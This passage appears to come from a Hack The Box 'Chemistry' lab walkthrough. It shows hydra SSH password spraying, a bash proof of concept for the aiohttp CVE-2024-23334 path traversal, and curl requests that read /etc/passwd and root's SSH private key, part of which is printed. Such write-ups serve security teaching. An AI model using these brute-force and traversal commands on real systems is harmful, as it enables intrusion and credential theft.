+</span></span><span style=display:flex><span>Recovered........: 4/14 <span style=color:#f92672>(</span>28.57%<span style=color:#f92672>)</span> Digests <span style=color:#f92672>(</span>total<span style=color:#f92672>)</span>, 4/14 <span style=color:#f92672>(</span>28.57%<span style=color:#f92672>)</span> Digests <span style=color:#f92672>(</span>new<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Progress.........: 14344385/14344385 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Rejected.........: 0/14344385 <span style=color:#f92672>(</span>0.00%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Restore.Point....: 14344385/14344385 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span style=display:flex><span>Candidate.Engine.: Device Generator
+</span></span><span style=display:flex><span>Candidates.#1....: $HEX<span style=color:#f92672>[</span>284d756666696e29<span style=color:#f92672>]</span> -&gt; $HEX<span style=color:#f92672>[</span>042a0337c2a156616d6f732103<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Started: Mon Jul  <span style=color:#ae81ff>7</span> 09:58:22 <span style=color:#ae81ff>2025</span>
+</span></span><span style=display:flex><span>Stopped: Mon Jul  <span style=color:#ae81ff>7</span> 09:58:26 <span style=color:#ae81ff>2025</span>
+</span></span></code></pre></div><p>Sure enough, with hydra we discover that rosa reused her password:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ hydra -L users -P pass ssh://chemistry
+</span></span><span style=display:flex><span>Hydra v9.5 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2023</span> by van Hauser/THC &amp; David Maciejak - Please <span style=color:#66d9ef>do</span> not use in military or secret service organizations, or <span style=color:#66d9ef>for</span> illegal purposes <span style=color:#f92672>(</span>this is non-binding, these *** ignore laws and ethics anyway<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> starting at 2025-07-07 09:59:32
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> max <span style=color:#ae81ff>15</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>15</span> tasks, <span style=color:#ae81ff>15</span> login tries <span style=color:#f92672>(</span>l:3/p:5<span style=color:#f92672>)</span>, ~1 try per task
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking ssh://chemistry:22/
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: chemistry   login: rosa   password: unicorniosrosados
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> target successfully completed, <span style=color:#ae81ff>1</span> valid password found
+</span></span><span style=display:flex><span>Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> finished at 2025-07-07 09:59:41
+</span></span></code></pre></div><p>Annnd we&rsquo;re in.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ ssh rosa@chemistry
+</span></span><span style=display:flex><span>rosa@chemistry<span style=color:#960050;background-color:#1e0010>&#39;</span>s password:
+</span></span><span style=display:flex><span>Welcome to Ubuntu 20.04.6 LTS <span style=color:#f92672>(</span>GNU/Linux 5.4.0-196-generic x86_64<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
+</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/pro
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> System information as of Mon <span style=color:#ae81ff>07</span> Jul <span style=color:#ae81ff>2025</span> 03:59:37 PM UTC
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  System load:           0.08
+</span></span><span style=display:flex><span>  Usage of /:            73.5% of 5.08GB
+</span></span><span style=display:flex><span>  Memory usage:          22%
+</span></span><span style=display:flex><span>  Swap usage:            0%
+</span></span><span style=display:flex><span>  Processes:             <span style=color:#ae81ff>235</span>
+</span></span><span style=display:flex><span>  Users logged in:       <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>  IPv4 address <span style=color:#66d9ef>for</span> eth0: 10.129.231.170
+</span></span><span style=display:flex><span>  IPv6 address <span style=color:#66d9ef>for</span> eth0: dead:beef::250:56ff:feb0:966d
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Expanded Security Maintenance <span style=color:#66d9ef>for</span> Applications is not enabled.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span> updates can be applied immediately.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>9</span> additional security updates can be applied with ESM Apps.
+</span></span><span style=display:flex><span>Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>The list of available updates is more than a week old.
+</span></span><span style=display:flex><span>To check <span style=color:#66d9ef>for</span> new updates run: sudo apt update
+</span></span><span style=display:flex><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>rosa@chemistry:~$ cat user.txt
+</span></span><span style=display:flex><span>919c61f8074de4e1xxxxxxxxxxxxxxxx
+</span></span></code></pre></div><h3 id=getting-root>Getting Root</h3><p>Sadly, rosa doesn&rsquo;t have sudo privileges:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rosa@chemistry:~$ sudo -l
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> rosa:
+</span></span><span style=display:flex><span>Sorry, user rosa may not run sudo on chemistry.
+</span></span></code></pre></div><p>Looking around a bit, we notice that there is a root-owned <code>monitoring_site</code> directory in <code>/opt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rosa@chemistry:/opt$ ll
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>12</span>
+</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>3</span> root root <span style=color:#ae81ff>4096</span> Jun <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2024</span> ./
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>19</span> root root <span style=color:#ae81ff>4096</span> Oct <span style=color:#ae81ff>11</span>  <span style=color:#ae81ff>2024</span> ../
+</span></span><span style=display:flex><span>drwx------  <span style=color:#ae81ff>5</span> root root <span style=color:#ae81ff>4096</span> Oct  <span style=color:#ae81ff>9</span>  <span style=color:#ae81ff>2024</span> monitoring_site/
+</span></span></code></pre></div><p>This sounds a lot like there&rsquo;s a localhost site running. We can see this by using <code>ps aux</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root        <span style=color:#ae81ff>1040</span>  0.0  1.3  <span style=color:#ae81ff>35524</span> <span style=color:#ae81ff>27572</span> ?        Ss   03:35   0:00 /usr/bin/python3.9 /opt/monitoring_site/app.py
+</span></span></code></pre></div><p>Looks like it&rsquo;s probably running on local port 8080:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rosa@chemistry:/opt$ netstat -tlnp
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>Not all processes could be identified, non-owned process info
+</span></span><span style=display:flex><span> will not be shown, you would have to be root to see it all.<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Active Internet connections <span style=color:#f92672>(</span>only servers<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:5000            0.0.0.0:*               LISTEN      -
+</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
+</span></span><span style=display:flex><span>tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::22                   :::*                    LISTEN      -
+</span></span></code></pre></div><p>Yep!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rosa@chemistry:/opt$ curl http://localhost:8080
+</span></span><span style=display:flex><span>&lt;!DOCTYPE html&gt;
+</span></span><span style=display:flex><span>&lt;html lang<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
+</span></span><span style=display:flex><span>&lt;head&gt;
+</span></span><span style=display:flex><span>    &lt;meta charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;meta name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;viewport&#34;</span> content<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;title&gt;Site Monitoring&lt;/title&gt;
+</span></span><span style=display:flex><span>    &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/assets/css/all.min.css&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;script src<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/assets/js/jquery-3.6.0.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style=display:flex><span>    &lt;script src<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/assets/js/chart.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style=display:flex><span>    &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/assets/css/style.css&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;style&gt;
+</span></span><span style=display:flex><span>    h2 <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>      color: black;
+</span></span><span style=display:flex><span>      font-style: italic;
+</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    &lt;/style&gt;
+</span></span><span style=display:flex><span>&lt;/head&gt;
+</span></span><span style=display:flex><span>&lt;body&gt;
+</span></span><span style=display:flex><span>    &lt;nav class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;navbar&#34;</span>&gt;
+</span></span><span style=display:flex><span>        &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;container&#34;</span>&gt;
+</span></span><span style=display:flex><span>            &lt;h1 class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;logo&#34;</span>&gt;&lt;i class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;fas fa-chart-line&#34;</span>&gt;&lt;/i&gt; Site Monitoring&lt;/h1&gt;
+</span></span><span style=display:flex><span>            &lt;ul class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;nav-links&#34;</span>&gt;
+</span></span><span style=display:flex><span>                &lt;li&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span> id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;home&#34;</span>&gt;&lt;i class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;fas fa-home&#34;</span>&gt;&lt;/i&gt; Home&lt;/a&gt;&lt;/li&gt;
+</span></span><span style=display:flex><span>                &lt;li&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span> id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;start-service&#34;</span>&gt;&lt;i class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;fas fa-play&#34;</span>&gt;&lt;/i&gt; Start Service&lt;/a&gt;&lt;/li&gt;
+</span></span><span style=display:flex><span>                &lt;li&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span> id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stop-service&#34;</span>&gt;&lt;i class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;fas fa-stop&#34;</span>&gt;&lt;/i&gt; Stop Service&lt;/a&gt;&lt;/li&gt;
+</span></span><span style=display:flex><span>                &lt;li&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span> id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;list-services&#34;</span>&gt;&lt;i class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;fas fa-list&#34;</span>&gt;&lt;/i&gt; List Services&lt;/a&gt;&lt;/li&gt;
+</span></span><span style=display:flex><span>                &lt;li&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span> id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;check-attacks&#34;</span>&gt;&lt;i class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;fas fa-exclamation-triangle&#34;</span>&gt;&lt;/i&gt; Check Attacks&lt;/a&gt;&lt;/li&gt;
+</span></span><span style=display:flex><span>                .........
+</span></span></code></pre></div><p>Let&rsquo;s use ssh tunneling to make that port available to us locally for easier perusing:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh -L 8080:localhost:8080 rosa@chemistry
+</span></span></code></pre></div><figure style=display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%><img src=/posts/chemistry-htb-walkthrough/monitoringsite.png alt="Monitoring site screenshot" loading=lazy style="max-width:100%;height:auto;display:block;margin:0 auto"></figure><p>There&rsquo;s a simple monitoring site here. We can see which services are running and stopped, and it also appears we can start and stop services as we please - or at least at first glance. Clicking start or stop service tell us that that functionality is not available yet. Looking at the list of services, we can see this is the current state of the machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Service List
+</span></span><span style=display:flex><span>Running Services:
+</span></span><span style=display:flex><span>apparmor
+</span></span><span style=display:flex><span>apport
+</span></span><span style=display:flex><span>atd
+</span></span><span style=display:flex><span>auditd
+</span></span><span style=display:flex><span>cron
+</span></span><span style=display:flex><span>dbus
+</span></span><span style=display:flex><span>irqbalance
+</span></span><span style=display:flex><span>kmod
+</span></span><span style=display:flex><span>netfilter-persistent
+</span></span><span style=display:flex><span>networking
+</span></span><span style=display:flex><span>open-vm-tools
+</span></span><span style=display:flex><span>procps
+</span></span><span style=display:flex><span>rsyslog
+</span></span><span style=display:flex><span>ssh
+</span></span><span style=display:flex><span>udev
+</span></span><span style=display:flex><span>Stopped Services:
+</span></span><span style=display:flex><span>console-setup.sh
+</span></span><span style=display:flex><span>cryptdisks
+</span></span><span style=display:flex><span>cryptdisks-early
+</span></span><span style=display:flex><span>grub-common
+</span></span><span style=display:flex><span>hwclock.sh
+</span></span><span style=display:flex><span>iscsid
+</span></span><span style=display:flex><span>keyboard-setup.sh
+</span></span><span style=display:flex><span>lvm2
+</span></span><span style=display:flex><span>lvm2-lvmpolld
+</span></span><span style=display:flex><span>open-iscsi
+</span></span><span style=display:flex><span>plymouth
+</span></span><span style=display:flex><span>plymouth-log
+</span></span><span style=display:flex><span>rsync
+</span></span><span style=display:flex><span>screen-cleanup
+</span></span><span style=display:flex><span>uuidd
+</span></span></code></pre></div><p>Looking at the headers sent by the site, we can see that it&rsquo;s running aiohttp/3.9.1: <code>Server: Python/3.9 aiohttp/3.9.1</code>. A quick search leads us to CVE-2024-23334, a path traversal vulnerability in this version. There&rsquo;s a POC here: <a href=https://github.com/z3rObyte/CVE-2024-23334-PoC>https://github.com/z3rObyte/CVE-2024-23334-PoC</a></p><p>The exploit is pretty simple:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>url<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://localhost:8081&#34;</span>
+</span></span><span style=display:flex><span>string<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;../&#34;</span>
+</span></span><span style=display:flex><span>payload<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/static/&#34;</span>
+</span></span><span style=display:flex><span>file<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;etc/passwd&#34;</span> <span style=color:#75715e># without the first /</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> <span style=color:#f92672>((</span>i<span style=color:#f92672>=</span>0; i&lt;15; i++<span style=color:#f92672>))</span>; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    payload<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;</span>$string<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>    echo <span style=color:#e6db74>&#34;[+] Testing with </span>$payload$file<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>    status_code<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>curl --path-as-is -s -o /dev/null -w <span style=color:#e6db74>&#34;%{http_code}&#34;</span> <span style=color:#e6db74>&#34;</span>$url$payload$file<span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>    echo -e <span style=color:#e6db74>&#34;\tStatus code --&gt; </span>$status_code<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> $status_code -eq <span style=color:#ae81ff>200</span> <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>        curl -s --path-as-is <span style=color:#e6db74>&#34;</span>$url$payload$file<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>        break
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span></code></pre></div><p>Looking at what this is doing, it&rsquo;s essentially constructing a url that looks like <code>http://localhost:8081/static/../etc/passwd</code>. It appears by putting <code>..</code> in the url we can read arbitrary files. We know that this server is running as root, and that the server is located at /opt/monitoring_site. We can craft a url that looks like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://localhost:8080/assets/../../../etc/passwd
+</span></span></code></pre></div><p>to verify the exploit, and then run it like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl --path-as-is -s <span style=color:#e6db74>&#34;http://localhost:8080/assets/../../../etc/passwd&#34;</span>
+</span></span></code></pre></div><p>It works!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rosa@chemistry:~$ curl --path-as-is -s <span style=color:#e6db74>&#34;http://localhost:8080/assets/../../../etc/passwd&#34;</span>
+</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style=display:flex><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style=display:flex><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+</span></span><span style=display:flex><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+</span></span><span style=display:flex><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span style=display:flex><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span style=display:flex><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+</span></span><span style=display:flex><span>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+</span></span><span style=display:flex><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
+</span></span><span style=display:flex><span>fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span style=display:flex><span>sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span style=display:flex><span>rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
+</span></span><span style=display:flex><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+</span></span><span style=display:flex><span>app:x:1001:1001:,,,:/home/app:/bin/bash
+</span></span><span style=display:flex><span>_laurel:x:997:997::/var/log/laurel:/bin/false
+</span></span></code></pre></div><p>Cool!</p><p>Let&rsquo;s see if root has an SSH key:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rosa@chemistry:~$ curl --path-as-is -s <span style=color:#e6db74>&#34;http://localhost:8080/assets/../../../root/.ssh/id_rsa&#34;</span>
+</span></span><span style=display:flex><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style=display:flex><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+</span></span><span style=display:flex><span>NhAAAAAwEAAQAAAYEAsFbYzGxskgZ6YM1LOUJsjU66WHi8Y2ZFQcM3G8VjO+NHKK8P0hIU
+</span></span><span style=display:flex><span>UbnmTGaPeW4evLeehnYFQleaC9u//vciBLNOWGqeg6Kjsq2lVRkAvwK2suJSTtVZ8qGi1v
+</span></span><span style=display:flex><span>j0wO69QoWrHERaRqmTzranVyYAdTmiXlGqUyiy0I7GVYqhv/QC7jt6For4PMAjcT0ED3Gk
+</span></span><span style=display:flex><span>HVJONbz2eav5aFJcOvsCG1aC93Le5R43Wgwo7kHPlfM5DjSDRqmBxZpaLpWK3HwCKYITbo
+</span></span><span style=display:flex><span>DfYsOMY0zyI0k5yLl1s685qJIYJHmin9HZBmDIwS7e2riTHhNbt2naHxd0WkJ8PUTgXuV2
+</span></span><span style=display:flex><span>UOljWP/TVPTkM5byav5bzhIwxhtdTy02DWjqFQn2kaQ8xe9X+Ymrf2wK8C4ezAycvlf3Iv
+</span></span><span style=display:flex><span>ATj++Xrpmmh9uR1HdS1XvD7glEFqNbYo3Q/OhiMto1JFqgWugeHm715yDnB3A+og4SFzrE
+</span></span><span style=display:flex><span>vrLegAOwvNlDYGjJWnTqEmUDk9ruO4Eq4ad1TYMbAAAFiPikP5X4pD+VAAAAB3NzaC1yc2
+</span></span><span style=display:flex><span>EAAAGBALBW2MxsbJIGemDNSzlCbI1Oulh4vGNmRUHDNxvFYzvjRyivD9ISFFG55kxmj3lu
+</span></span><span style=display:flex><span>Hry3noZ2BUJXmgvbv/73IgSzTlhqnoOio7KtpVUZAL8CtrLiUk7VWfKhotb49MDuvUKFqx
+</span></span><span style=display:flex><span>xEWkapk862p1cmAHU5ol5RqlMostCOxlWKob/0Au47ehaK+DzAI3E9BA9xpB1STjW89nmr
+</span></span><span style=display:flex><span>+WhSXDr7AhtWgvdy3uUeN1oMKO5Bz5XzOQ40g0apgcWaWi6Vitx8AimCE26A32LDjGNM8i
+</span></span><span style=display:flex><span>NJOci5dbOvOaiSGCR5op/R2QZgyMEu3tq4kx4TW7dp2h8XdFpCfD1E4F7ldlDpY1j/01T0
+</span></span><span style=display:flex><span>5DOW8mr+W84SMMYbXU8tNg1o6hUJ9pGkPMXvV/mJq39sCvAuHswMnL5X9yLwE4/vl66Zpo
+</span></span><span style=display:flex><span>fbkdR3UtV7w+4JRBajW2KN0PzoYjLaNSRaoFroHh5u9ecg5wdwPqIOEhc6xL6y3oADsLzZ
+</span></span><span style=display:flex><span>Q2BoyVp06hJlA5Pa7juBKuGndU2DGwAAAAMBAAEAAAGBAJikdMJv0IOO6/xDeSw1nXWsgo
+</span></span><span style=display:flex><span>325Uw9yRGmBFwbv0yl7oD/GPjFAaXE/99+oA+DDURaxfSq0N6eqhA9xrLUBjR/agALOu/D
+</span></span><span style=display:flex><span>p2QSAB3rqMOve6rZUlo/QL9Qv37KvkML5fRhdL7hRCwKupGjdrNvh9Hxc+WlV4Too/D4xi
+</span></span><span style=display:flex><span>JiAKYCeU7zWTmOTld4ErYBFTSxMFjZWC4YRlsITLrLIF9FzIsRlgjQ/LTkNRHTmNK1URYC
+</span></span><span style=display:flex><span>Fo9/UWuna1g7xniwpiU5icwm3Ru4nGtVQnrAMszn10E3kPfjvN2DFV18+pmkbNu2RKy5mJ
+</span></span><span style=display:flex><span>XpfF5LCPip69nDbDRbF22stGpSJ5mkRXUjvXh1J1R1HQ5pns38TGpPv9Pidom2QTpjdiev
+</span></span><span style=display:flex><span>dUmez+ByylZZd2p7wdS7pzexzG0SkmlleZRMVjobauYmCZLIT3coK4g9YGlBHkc0Ck6mBU
+</span></span><span style=display:flex><span>HvwJLAaodQ9Ts9m8i4yrwltLwVI/l+TtaVi3qBDf4ZtIdMKZU3hex+MlEG74f4j5BlUQAA
+</span></span><span style=display:flex><span>AMB6voaH6wysSWeG55LhaBSpnlZrOq7RiGbGIe0qFg+1S2JfesHGcBTAr6J4PLzfFXfijz
